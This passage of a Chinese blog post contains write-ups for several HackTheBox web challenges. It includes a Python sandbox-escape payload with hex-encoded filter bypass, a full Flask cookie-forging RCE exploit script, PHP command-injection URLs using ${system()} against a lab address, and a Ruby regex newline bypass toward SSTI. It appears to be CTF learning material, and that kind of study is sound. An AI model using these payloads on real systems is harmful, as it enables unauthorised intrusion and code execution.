 <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"\n\n"</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>吐了 openvpn 炸了……</p>
<p>感觉就是异步写一个代码吧，接近成功了，但还是寄了</p>
<h2 id="HackTheBox-Easter-Bunny"><a href="#HackTheBox-Easter-Bunny" class="headerlink" title="HackTheBox-Easter-Bunny"></a>HackTheBox-Easter-Bunny</h2><h3 id="0x01-前言-2"><a href="#0x01-前言-2" class="headerlink" title="0x01 前言"></a>0x01 前言</h3><p>最近学习 Port 的 Web Cache Poisoning 部分，怎么添加 <code>X-Forwarded-Host</code> 之后发包一直失败，稀里糊涂的。。。。</p>
<h3 id="0x02-初识靶场-2"><a href="#0x02-初识靶场-2" class="headerlink" title="0x02 初识靶场"></a>0x02 初识靶场</h3><ul>
<li>靶场界面如图所示</li>
</ul>
<img src="/2022/07/20/HackTheBox%E4%B9%8BWeb%E9%83%A8%E5%88%86%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/EasterBunny.png" class="">

<p>靶场主要分三个模块：</p>
<ol>
<li>写信模块，Write New Letter。</li>
<li>发送新建模块，点击 stamp 为贴邮票，也就是发送了。</li>
<li>查看其他信件模块。</li>
</ol>
<p>简单抓包了一下，在信中写了 XSS 的 Payload</p>
<img src="/2022/07/20/HackTheBox%E4%B9%8BWeb%E9%83%A8%E5%88%86%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/XSS.png" class="">

<p>当我们点击到 Letter #3 的时候出现了不一样的东西。</p>
<img src="/2022/07/20/HackTheBox%E4%B9%8BWeb%E9%83%A8%E5%88%86%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/StrangeLetter.png" class="">

<p>没有什么用处，再全部抓了遍包，没有发现什么明显的攻击点，进行代码审计的环节 ~</p>
<h3 id="0x03-代码审计-1"><a href="#0x03-代码审计-1" class="headerlink" title="0x03 代码审计"></a>0x03 代码审计</h3><ul>
<li>老样子，先看路由</li>
</ul>
<p>看了一圈，没有明显看到与 Flag 有关的东西，但是找到一处可疑的地方，第 47 - 62 行。</p>
<img src="/2022/07/20/HackTheBox%E4%B9%8BWeb%E9%83%A8%E5%88%86%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/StrangeFound.png" class="">

<p>这里通过 Auth 就能够获取到 Flag 了吧，可是根据路由的第一行我们需要跳转到 <code>/utils/authorisation</code> 去看。</p>
<p><strong>路由第一行</strong></p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">const</span> <span class="token punctuation">&#123;</span> isAdmin<span class="token punctuation">,</span> authSecret <span class="token punctuation">&#125;</span> <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">"../utils/authorisation"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><strong>authorisation.js</strong></p>
<img src="/2022/07/20/HackTheBox%E4%B9%8BWeb%E9%83%A8%E5%88%86%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/AuthJSCode.png" class="">
<p>好吧，这里的 <code>authSecret</code> 是随机生成的，如果要使得 req.cookie 与 <code>authSecret</code> 相等是不太可能。但是这里要求我们以 127.0.0.1 进行身份认证，SSRF(?)。不清楚，去看看 <code>database.js</code></p>
<p><strong>database.js</strong></p>
<img src="/2022/07/20/HackTheBox%E4%B9%8BWeb%E9%83%A8%E5%88%86%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/DatabaseCode.png" class="">

<p>数据库当中，message &#x3D; 3 的地方存在 Flag，我们接下来的思路便是成功身份认证了。</p>
<p>SQL 语句预编译了，无法进行 SQL 注入了。</p>
<h2 id="HackTheBox-interdimensional-internet"><a href="#HackTheBox-interdimensional-internet" class="headerlink" title="HackTheBox-interdimensional internet"></a>HackTheBox-interdimensional internet</h2><h3 id="0x01-前言-3"><a href="#0x01-前言-3" class="headerlink" title="0x01 前言"></a>0x01 前言</h3><p>最近发现 HTB 还是有很多题目是脑洞题，那些脑洞题就不打算做了，还是依靠 CTF 来学习漏洞为主。</p>
<h3 id="0x02-初识靶场-3"><a href="#0x02-初识靶场-3" class="headerlink" title="0x02 初识靶场"></a>0x02 初识靶场</h3><p>靶场界面如图所示</p>


<p>讲道理，有点丑，不是很舒服，每一次刷新界面，都会出现一个随机数。</p>
<p>查看一下源码，发现有一段注解 “&#x2F;debug”，尝试访问 &#x2F;debug 接口；发现是题目的源代码。</p>
<img src="/2022/07/20/HackTheBox%E4%B9%8BWeb%E9%83%A8%E5%88%86%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/interdimensionalinternetIndexCode2.png" class="">

<h3 id="0x03-代码审计-2"><a href="#0x03-代码审计-2" class="headerlink" title="0x03 代码审计"></a>0x03 代码审计</h3><ul>
<li>粗略审计一遍源码，发现并没有 flag 的字样，判断获取 flag 的手段为 <code>cat flag</code>，我们下一步去寻找一下存在命令执行的地方。</li>
</ul>
<blockquote>
<p>命令执行部分的代码</p>
</blockquote>
<img src="/2022/07/20/HackTheBox%E4%B9%8BWeb%E9%83%A8%E5%88%86%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/OSCommandExec.png" class="">

<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">calc</span><span class="token punctuation">(</span>recipe<span class="token punctuation">)</span><span class="token punctuation">:</span>
 <span class="token keyword">global</span> garage
 builtins<span class="token punctuation">,</span> garage <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">'__builtins__'</span><span class="token punctuation">:</span> <span class="token boolean">None</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>
 <span class="token keyword">try</span><span class="token punctuation">:</span> <span class="token keyword">exec</span><span class="token punctuation">(</span>recipe<span class="token punctuation">,</span> builtins<span class="token punctuation">,</span> garage<span class="token punctuation">)</span>
 <span class="token keyword">except</span><span class="token punctuation">:</span> <span class="token keyword">pass</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><code>__builtins__</code> 这个函数用来内建对象，这里并不影响代码审计，关键问题在 recipe 上面。recipe 是传进来用于命令执行的语句。深入分析</p>
<p>处理 recipe 的代码如下，太长了，先不贴，用图片来说明。</p>
<img src="/2022/07/20/HackTheBox%E4%B9%8BWeb%E9%83%A8%E5%88%86%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/RecipeCode.png" class="">

<ul>
<li>第 16 - 19 行</li>
</ul>
<img src="/2022/07/20/HackTheBox%E4%B9%8BWeb%E9%83%A8%E5%88%86%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/ingredientANDmeasurements.png" class="">
<p>获取 <code>session</code> 的 <code>ingredient</code> 和 <code>measurements</code>，用他们拼接 <code>recipe</code> 变量。</p>
<ul>
<li>第 20 行之后的判断语句</li>
</ul>
<img src="/2022/07/20/HackTheBox%E4%B9%8BWeb%E9%83%A8%E5%88%86%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/RecipeMoreThan20.png" class="">

<p>若 <code>session</code> 的 <code>ingredient</code> 和 <code>measurements</code> 存在，并且 <code>recipe</code> 的长度 &gt; 20 ；就进入正则，判断传进来的 recipe 里面含不含有一堆字符，含的话直接拦截并返回。</p>
<p>若并没有达到条件，则会产生随机值并返回。所以核心在于 payload 的构造 ———— 如何绕过正则的匹配。</p>
<h3 id="0x04-构造-payload"><a href="#0x04-构造-payload" class="headerlink" title="0x04 构造 payload"></a>0x04 构造 payload</h3><p>绕过使用得是 hex 编码<br>python里字符串使用 <code>\xab</code> 来表示字符的，尝试一下payload。</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>
    recipe <span class="token operator">=</span> <span class="token triple-quoted-string string">'''
b = \x5b]
print b
'''</span>
    <span class="token keyword">if</span> re<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">r'\[|\(_\.'</span><span class="token punctuation">,</span> recipe<span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">print</span> <span class="token string">'invalid payload'</span>
    calc<span class="token punctuation">(</span>recipe<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>这样并不可以，<code>\x5b</code> 和 <code>[</code> 在python里应该是等价的。<br>但是这种包裹在字符串里然后并且 <code>\</code> 被 <code>\</code> 转义的 <code>\5b</code> 能绕过。</p>
<p>只要把print改成exec就可以把b当成一个语句执行了。</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>
    recipe <span class="token operator">=</span> <span class="token triple-quoted-string string">'''
b = "builtins = \\x5bi for i in \\x28)\\x2e\\x5f\\x5fclass\\x5f\\x5f\\x2e\\x5f\\x5fbases\\x5f\\x5f\\x5b0]\\x2e\\x5f\\x5fsubclasses\\x5f\\x5f\\x28) if i\\x2e\\x5f\\x5fname\\x5f\\x5f=='catch\\x5fwarnings']\\x5b0]\\x28)\\x2e\\x5fmodule\\x2e\\x5f\\x5fbuiltins\\x5f\\x5f"
exec b
print builtins
'''</span>
    <span class="token keyword">if</span> re<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">r'\[|\(_\.'</span><span class="token punctuation">,</span> recipe<span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">print</span> <span class="token string">'invalid payload'</span>
    calc<span class="token punctuation">(</span>recipe<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<ul>
<li>编写 exp，借用外国师傅的 <a class="link"   target="_blank" rel="noopener" href="https://github.com/d4rk007/ctfs/blob/main/Interdimensional-Internet/exploit.py" >exp.py<i class="fas fa-external-link-alt"></i></a></li>
</ul>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests

<span class="token keyword">from</span> flask<span class="token punctuation">.</span>sessions <span class="token keyword">import</span> SecureCookieSessionInterface

<span class="token keyword">from</span> itsdangerous <span class="token keyword">import</span> URLSafeTimedSerializer

TARGET <span class="token operator">=</span> <span class="token string">'http://&lt;IP>:&lt;PORT>/'</span>

SECRET_KEY <span class="token operator">=</span> <span class="token string">'&lt;SECRET_KEY>'</span>

<span class="token comment"># PAYLOAD = u"""i=().__class__.__base__.__subclasses__()[59]()._module.__builtins__['__import__']</span>

<span class="token comment"># i('flask').session['x']=i('os').popen('ls').read()"""</span>

PAYLOAD <span class="token operator">=</span> <span class="token triple-quoted-string string">u"""i=().__class__.__base__.__subclasses__()[59]()._module.__builtins__['__import__']

i('flask').session['x']=i('os').popen('cat t*').read()"""</span>

<span class="token keyword">class</span> <span class="token class-name">flask_encoding</span><span class="token punctuation">:</span>

<span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>

scsi <span class="token operator">=</span> SecureCookieSessionInterface<span class="token punctuation">(</span><span class="token punctuation">)</span>

signer_kwargs <span class="token operator">=</span> <span class="token builtin">dict</span><span class="token punctuation">(</span>

key_derivation<span class="token operator">=</span>scsi<span class="token punctuation">.</span>key_derivation<span class="token punctuation">,</span>

digest_method<span class="token operator">=</span>scsi<span class="token punctuation">.</span>digest_method

<span class="token punctuation">)</span>

self<span class="token punctuation">.</span>serializer <span class="token operator">=</span> URLSafeTimedSerializer<span class="token punctuation">(</span>SECRET_KEY<span class="token punctuation">,</span> salt<span class="token operator">=</span>scsi<span class="token punctuation">.</span>salt<span class="token punctuation">,</span>

serializer<span class="token operator">=</span>scsi<span class="token punctuation">.</span>serializer<span class="token punctuation">,</span>

signer_kwargs<span class="token operator">=</span>signer_kwargs

<span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">deserialize</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> cookie_str<span class="token punctuation">)</span><span class="token punctuation">:</span>

<span class="token keyword">return</span> self<span class="token punctuation">.</span>serializer<span class="token punctuation">.</span>loads<span class="token punctuation">(</span>cookie_str<span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">serialize</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> cookie_dict<span class="token punctuation">)</span><span class="token punctuation">:</span>

<span class="token keyword">return</span> self<span class="token punctuation">.</span>serializer<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>cookie_dict<span class="token punctuation">)</span>

<span class="token comment"># waf bypass encoding</span>

<span class="token keyword">def</span> <span class="token function">encode_payload</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">:</span>

payload <span class="token operator">=</span> <span class="token string">u'"a"\nexec """'</span> <span class="token operator">+</span> payload <span class="token operator">+</span> <span class="token string">u'"""'</span>

blacklist <span class="token operator">=</span> <span class="token punctuation">&#123;</span>

<span class="token string">'['</span><span class="token punctuation">:</span> <span class="token string">'\\x5b'</span><span class="token punctuation">,</span>

<span class="token string">'('</span><span class="token punctuation">:</span> <span class="token string">'\\x28'</span><span class="token punctuation">,</span>

<span class="token string">'_'</span><span class="token punctuation">:</span> <span class="token string">'\\x5f'</span><span class="token punctuation">,</span>

<span class="token string">'.'</span><span class="token punctuation">:</span> <span class="token string">'\\x2e'</span>

<span class="token punctuation">&#125;</span>

<span class="token keyword">for</span> c<span class="token punctuation">,</span>h <span class="token keyword">in</span> blacklist<span class="token punctuation">.</span>items<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>

<span class="token keyword">if</span> c <span class="token keyword">in</span> payload<span class="token punctuation">:</span>

payload <span class="token operator">=</span> payload<span class="token punctuation">.</span>replace<span class="token punctuation">(</span>c<span class="token punctuation">,</span> h<span class="token punctuation">)</span>

<span class="token keyword">return</span> payload

<span class="token keyword">def</span> <span class="token function">modify_cookie</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">:</span>

f <span class="token operator">=</span> flask_encoding<span class="token punctuation">(</span><span class="token punctuation">)</span>

cookie_dict <span class="token operator">=</span> f<span class="token punctuation">.</span>deserialize<span class="token punctuation">(</span>s<span class="token punctuation">.</span>cookies<span class="token punctuation">[</span><span class="token string">'session'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>

cookie_dict<span class="token punctuation">[</span><span class="token string">'ingredient'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">u'i'</span>

cookie_dict<span class="token punctuation">[</span><span class="token string">'measurements'</span><span class="token punctuation">]</span> <span class="token operator">=</span> encode_payload<span class="token punctuation">(</span>PAYLOAD<span class="token punctuation">)</span>

s<span class="token punctuation">.</span>cookies<span class="token punctuation">[</span><span class="token string">'session'</span><span class="token punctuation">]</span> <span class="token operator">=</span> f<span class="token punctuation">.</span>serialize<span class="token punctuation">(</span>cookie_dict<span class="token punctuation">)</span>

<span class="token keyword">return</span> s<span class="token punctuation">,</span> f

<span class="token keyword">def</span> <span class="token function">exec_rce</span><span class="token punctuation">(</span>s<span class="token punctuation">,</span> f<span class="token punctuation">)</span><span class="token punctuation">:</span>

r <span class="token operator">=</span> s<span class="token punctuation">.</span>get<span class="token punctuation">(</span>TARGET<span class="token punctuation">)</span>

<span class="token keyword">try</span><span class="token punctuation">:</span>

enc_exfil_data <span class="token operator">=</span> r<span class="token punctuation">.</span>cookies<span class="token punctuation">[</span><span class="token string">'session'</span><span class="token punctuation">]</span>

<span class="token keyword">except</span> KeyError<span class="token punctuation">:</span>

<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'Exploit failed, session cookie not found!'</span><span class="token punctuation">)</span>

exit<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>

<span class="token keyword">return</span> f<span class="token punctuation">.</span>deserialize<span class="token punctuation">(</span>enc_exfil_data<span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>

s <span class="token operator">=</span> requests<span class="token punctuation">.</span>session<span class="token punctuation">(</span><span class="token punctuation">)</span>

s<span class="token punctuation">.</span>get<span class="token punctuation">(</span>TARGET<span class="token punctuation">)</span>

s<span class="token punctuation">,</span> f <span class="token operator">=</span> modify_cookie<span class="token punctuation">(</span>s<span class="token punctuation">)</span>

exfil_data <span class="token operator">=</span> exec_rce<span class="token punctuation">(</span>s<span class="token punctuation">,</span> f<span class="token punctuation">)</span>

<span class="token keyword">print</span><span class="token punctuation">(</span>exfil_data<span class="token punctuation">[</span><span class="token string">'x'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>

<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>

main<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h3 id="0x05-总结"><a href="#0x05-总结" class="headerlink" title="0x05 总结"></a>0x05 总结</h3><p>太难了，光是正则就够我吃一壶的了。<br>再加上自己对于魔法函数的应用还是太差了，以后回过头来可以再看看。</p>
<h2 id="HackTheBox-LoveTok"><a href="#HackTheBox-LoveTok" class="headerlink" title="HackTheBox-LoveTok"></a>HackTheBox-LoveTok</h2><h3 id="0x01-简单分析靶场"><a href="#0x01-简单分析靶场" class="headerlink" title="0x01 简单分析靶场"></a>0x01 简单分析靶场</h3><ul>
<li>靶场界面如图所示</li>
</ul>
<img src="/2022/07/20/HackTheBox%E4%B9%8BWeb%E9%83%A8%E5%88%86%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/Index.png" class="">

<p>f12 一下发现一串 SHA512 的序列</p>
<pre class="line-numbers language-none"><code class="language-none">sha512-qTXRIMyZIFb8iQcfjXWCO8+M5Tbc38Qi5WzdPOYZHIlZpzBHG3L3by84BBBOiRGiEb7KKtAOAs5qYdUiZiQNNQ&#x3D;&#x3D;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>先放着吧，说不定到时候就用到了。</p>
<p>提示语也挺…… 嗯…… crazy 的。</p>
<img src="/2022/07/20/HackTheBox%E4%B9%8BWeb%E9%83%A8%E5%88%86%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/hint.png" class="">

<p>点击下面的按钮，生成了 Find Love 的时间，没什么用，再去扫一下目录吧。</p>
<ul>
<li>等待扫目录的时间，将其源代码拉下来看看，可能又要代码审计了。</li>
</ul>
<h3 id="0x02-代码审计-1"><a href="#0x02-代码审计-1" class="headerlink" title="0x02 代码审计"></a>0x02 代码审计</h3><h4 id="单刀直入，寻找-flag"><a href="#单刀直入，寻找-flag" class="headerlink" title="单刀直入，寻找 flag"></a>单刀直入，寻找 flag</h4><p>找遍所有文件，并未发现与 flag 有关的地方，这莫非是靠目录遍历打？或者是 上传 webshell 吗。思路不太确定，再看看代码吧</p>
<h4 id="未寻找到-flag，需要静下心来代码审计"><a href="#未寻找到-flag，需要静下心来代码审计" class="headerlink" title="未寻找到 flag，需要静下心来代码审计"></a>未寻找到 flag，需要静下心来代码审计</h4><p>既然没有获取到 flag 的代码，那么确定下来漏洞&#x2F;思路是命令执行，最终构造出来的 payload 一定是这样的</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php">xxxxxx<span class="token operator">/</span>cat<span class="token operator">/</span>flag<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<ul>
<li>看完了整个文件夹当中的 php 文件，在 TimeModel 函数下找到了可控变量 format</li>
<li>先简单介绍一下在 format 之前的 <code>addslashes</code> 函数</li>
</ul>
<p>php addslashes 函数的作用是在预定义的字符前面加上反斜杠，这些预定义字符包括：<br>单引号（’）；双引号（”）；反斜杠（\）；NULL</p>
<p>addslashes 函数经常使用在向数据库插入数据时，比如有一个字符串</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$str</span><span class="token operator">=</span>“my name’s wxp”<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>现在要将这个字符串插入到数据库表中，由于该字符串有单引号’，这样很可能与 MySQL 拼接字符串的单引号’冲突，导致 SQL 语句不正确，也就无法正常执行插入操作，此时我们需要使用 addslashes 函数处理这个字符串。如：</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$str</span><span class="token operator">=</span>“my name’s wxp”<span class="token punctuation">;</span>

<span class="token keyword">echo</span> <span class="token function">addslashes</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//输出my name’s wxp</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p>如果字符串$str&#x3D;”my name’s wxp”是使用POST和GET提交的数据，这个时候插入数据库中的数据是带反斜杠的，可知 addslashes 只是在 POST 和 GET 数据插入数据库时才会把反斜杠同时插入到数据库，其他情况下不会将反斜杠插入到数据库。</p>
<h4 id="利用可控制变量-format"><a href="#利用可控制变量-format" class="headerlink" title="利用可控制变量 format"></a>利用可控制变量 format</h4><ul>
<li>去查阅了一下 php 当中一般的命令执行 payload，并且浅探一下原理</li>
</ul>
<p>php GET 请求当中，可以通过 <code>?id=$&#123;phpinfo()&#125;</code> 这种简单的方式进行命令执行</p>
<p>当我们使用 <code>$&#123;&#125;</code> 时，内部的函数会被执行，一般出现这种现象都是后台未对传进的参数进行过滤&#x2F;防御&#x2F;校验。从而才会导致命令执行漏洞。</p>
<p>我们先编写 poc，在这一 poc 中，直接就执行 phpinfo 的命令了</p>
<pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;167.172.52.221:30001&#x2F;?format&#x3D;$&#123;phpinfo()&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<img src="/2022/07/20/HackTheBox%E4%B9%8BWeb%E9%83%A8%E5%88%86%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/phpinfo.png" class="">

<p>证明存在命令执行漏洞了，接着构造一下外带数据传参执行(这里直接命令执行是行不通的)。</p>
<pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;167.172.52.221:30001&#x2F;?format&#x3D;$&#123;system($_GET(0))&#125;&amp;0&#x3D;ls<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<img src="/2022/07/20/HackTheBox%E4%B9%8BWeb%E9%83%A8%E5%88%86%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/CommandOS.png" class="">

<p>原本想着 ls 直接搞出 flag 了，可谁知半路杀出个程咬金，命令执行失败了，这时猛地想到 format 之前有一个 addslashes 函数。所以，直接加上 <code>/</code> 即可</p>
<pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;167.172.52.221:30001&#x2F;?format&#x3D;$&#123;system($_GET(0))&#125;&amp;0&#x3D;ls &#x2F;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>成功执行</p>
<img src="/2022/07/20/HackTheBox%E4%B9%8BWeb%E9%83%A8%E5%88%86%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/OSucc.png" class="">

<p>最上面一行有一个 flagRPYIs，那么尝试 cat flagRPYIs，进一步构造 payload</p>
<pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;167.172.52.221:30001&#x2F;?format&#x3D;$&#123;system($_GET[0])&#125;&amp;0&#x3D;cat+&#x2F;flagRYPIs<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>这里的 <code>/</code> 要写在前面。</p>
<img src="/2022/07/20/HackTheBox%E4%B9%8BWeb%E9%83%A8%E5%88%86%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/LoveTokFlag.png" class="">

<p>成功过了 ~</p>
<h3 id="0x03-小结"><a href="#0x03-小结" class="headerlink" title="0x03 小结"></a>0x03 小结</h3><p>本题是一道简单的 php 命令执行，难点在于 addslashes 这一函数很容易被大家所忽视，这也给实战渗透时的命令执行绕过提供了一些思维。</p>
<h2 id="HackTheBox-Neonify"><a href="#HackTheBox-Neonify" class="headerlink" title="HackTheBox-Neonify"></a>HackTheBox-Neonify</h2><h3 id="0x01-前言-4"><a href="#0x01-前言-4" class="headerlink" title="0x01 前言"></a>0x01 前言</h3><p>HTB 最近又新出了几道题，来刷一刷看看。</p>
<h3 id="0x02-初识靶场-4"><a href="#0x02-初识靶场-4" class="headerlink" title="0x02 初识靶场"></a>0x02 初识靶场</h3><ul>
<li>靶场界面如图所示</li>
</ul>
<img src="/2022/07/20/HackTheBox%E4%B9%8BWeb%E9%83%A8%E5%88%86%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/Neonify.png" class="">

<p>算是一个不怎么难看的靶场，我们在框内输入任意内容，下面一行字符便会变成我们输入的。</p>
<p>看到一个框，第一想法一定是 XSS，尝试输入 <code>&lt;scipt&gt; alert(1) &lt;/script&gt;</code>，输入之后无特殊回显，感觉是过滤了字符与空格(?) 这里先打个问号。</p>
<p>感觉暂时没什么思路了，看源码吧。</p>
<ul>
<li>源码居然是 Ruby 写的后端，还是第一次看 Ruby 的代码审计。</li>
</ul>
<h3 id="0x03-代码审计-3"><a href="#0x03-代码审计-3" class="headerlink" title="0x03 代码审计"></a>0x03 代码审计</h3><ul>
<li>首先还是先看路由</li>
</ul>
<img src="/2022/07/20/HackTheBox%E4%B9%8BWeb%E9%83%A8%E5%88%86%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/RouteCode.png" class="">

<p>乍一看没什么，感觉突破点只能是在这一段代码了</p>
<pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby"><span class="token keyword">if</span> params<span class="token punctuation">[</span><span class="token symbol">:neon</span><span class="token punctuation">]</span> <span class="token operator">=~</span> <span class="token regex-literal"><span class="token regex">/^[0-9a-z ]+$/i</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>上谷歌去搜索一下，发现 Ruby 后端正则若是这么写会产生换行绕过。</p>
<img src="/2022/07/20/HackTheBox%E4%B9%8BWeb%E9%83%A8%E5%88%86%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/Regex.png" class="">

<p>于是 <code>neon=1111%0axxxxj!&lt;&gt;</code> 绕过正则限制</p>
<img src="/2022/07/20/HackTheBox%E4%B9%8BWeb%E9%83%A8%E5%88%86%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/SuccessBypass.png" class="">

<ul>
<li>感觉没什么用啊。前两天在看 SSTI，说到 Ruby 当中的模板引擎 ERB 中很可能存在 SSTI，尝试寻找一下 SSTI 点。</li>
</ul>
<p>ERB 的语法如下</p>
<pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby"><span class="token operator">&lt;</span><span class="token operator">%</span> <span class="token string-literal"><span class="token string">%>   在括号内执行 Ruby 代码

&lt;%= %></span></span>  在 <span class="token constant">ERB</span> 文件中打印一些东西

<span class="token operator">&lt;</span><span class="token operator">%=</span> rand<span class="token punctuation">(</span>n<span class="token punctuation">)</span> <span class="token string-literal"><span class="token string">%>   随机生成 0 到 n-1 之间的随机数

&lt;% -%></span></span>  避免在表达式后中断行

<span class="token operator">&lt;</span><span class="token operator">%</span><span class="token comment"># %>  括号内的注释；未发送到客户端(与HTML注释相反)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<blockquote>
<p>思路出来了：在 POST 请求当中对 neon 参数进行 SSTI</p>
</blockquote>
<h3 id="0x04-构造-EXP"><a href="#0x04-构造-EXP" class="headerlink" title="0x04 构造 EXP"></a>0x04 构造 EXP</h3><p>先探测 SSTI 的存在性，再进一步编写 EXP。Payload 如下</p>
<pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby"><span class="token number">1111</span>
